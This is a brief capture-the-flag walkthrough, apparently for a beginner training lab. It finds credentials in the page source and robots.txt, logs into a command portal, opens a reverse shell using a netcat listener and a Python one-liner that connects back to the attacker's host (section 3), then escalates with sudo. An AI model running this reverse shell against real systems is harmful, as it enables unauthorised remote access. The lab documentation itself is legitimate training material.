
---

# CTF Walkthrough Documentation

## 1. Enumeration

- **Inspect source code** of the main page → found a hardcoded username:
    
    ```
    R1ckRul3s
    ```
    
- **Check `robots.txt`** → discovered a password:
    
    ```
    Wubbalubbadubdub
    ```
    
- **Identify login portal** at:
    
    ```
    http://0.0.0.0/login.php
    ```
    

## 2. Initial Access

- Login with:
    
    - **Username:** `R1ckRul3s`
        
    - **Password:** `Wubbalubbadubdub`
        
- Upon successful login, a command prompt becomes available.
    

## 3. Reverse Shell

- Start a listener on the attacker machine:
    
    ```bash
    nc -lvnp 9001
    ```
    
- Execute reverse shell from target:
    
    ```bash
    export RHOST="0.0.0.0";export RPORT=9001;python3 -c 'import sys,socket,os,pty;
    s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
    ```
    

## 4. Privilege Escalation

- Stabilize shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    
- Try privilege escalation:
    
    ```bash
    sudo su
    ```
    

## 5. Flag Discovery

- Check current working directory, `/home`, and `/root` for flag files.
    
- Use `strings` or `cat` to extract flag values
---
